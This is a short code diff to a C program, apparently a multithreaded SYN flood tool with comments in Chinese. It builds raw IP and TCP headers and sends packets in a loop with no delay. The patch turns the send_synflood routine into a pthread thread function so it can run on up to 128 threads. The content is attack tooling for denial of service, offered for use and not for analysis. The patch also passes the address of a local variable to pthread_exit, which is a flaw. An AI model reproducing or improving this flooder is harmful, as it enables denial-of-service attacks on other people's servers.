@@ -19,6 +19,7 @@
 #include <stdlib.h>
 #include <time.h> 
 #include <arpa/inet.h>
+#include <pthread.h>
 
 /* 最多线程数 */
 #define MAXCHILD 128
@@ -134,8 +135,8 @@ init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
  * 填写IP头部，TCP头部
  * TCP伪头部仅用于校验和的计算
  */
-void
-send_synflood(struct sockaddr_in *addr)
+void*
+send_synflood(void *addr)
 { 
 	char buf[100], sendbuf[100];
 	int len;
@@ -176,7 +177,8 @@ send_synflood(struct sockaddr_in *addr)
 			< 0)
 		{
 			perror("sendto()");
-			pthread_exit("fail");
+			int exit_code=1;
+			pthread_exit(&exit_code);
 		}
 		//sleep(1);
 	}
